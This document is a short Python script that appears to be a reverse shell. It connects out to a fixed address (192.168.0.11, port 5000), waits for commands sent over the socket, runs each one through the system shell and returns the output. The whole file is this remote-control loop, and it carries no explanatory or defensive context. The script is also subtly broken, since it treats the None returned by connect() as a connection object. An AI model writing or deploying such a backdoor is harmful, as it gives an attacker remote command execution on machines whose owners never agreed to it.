import socket
import subprocess
import threading

def execute(command):
    process = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    if process.returncode:
        return process.stderr.decode()
    else:
        return process.stdout.decode()
    
def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        conn = s.connect(('192.168.0.11', 5000))
        print('Connection success!')
        while True:
            command = conn.recv(1024).decode()
            conn.sendall(execute(command).encode())

if __name__ == '__main__':
    main()